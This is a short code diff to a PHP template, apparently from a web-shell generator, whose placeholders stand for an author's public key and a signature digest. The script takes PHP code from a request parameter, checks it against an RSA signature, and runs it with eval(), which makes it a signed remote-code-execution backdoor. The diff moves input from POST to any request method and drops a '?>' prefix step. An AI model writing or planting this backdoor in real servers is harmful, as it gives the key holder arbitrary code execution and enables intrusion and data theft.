@@ -4,14 +4,11 @@ $k = <<<K
 ((author_pub))
 K;
 
-if (!isset($_POST['p']) || (!$p = $_POST['p']) || !isset($_POST['s']) || (1 !== openssl_verify($p, base64_decode($_POST['s']), $k, ((signature_digest))))) {
-  header($_SERVER['SERVER_PROTOCOL'] . ' 400 Bad Request');
+if (!isset($_REQUEST['p']) || (!$p = $_REQUEST['p']) || !isset($_REQUEST['s']) || (!$s = $_REQUEST['s']) || (1 !== openssl_verify($p, base64_decode($s), $k, ((signature_digest))))) {
+  header('HTTP/1.0 400 Bad Request');
   header('Content-Type: text/plain');
   readfile(__FILE__);
   exit;
 }
-
-if ($p[0] == '<')
-  $p = '?>' . $p;
 
 eval($p);
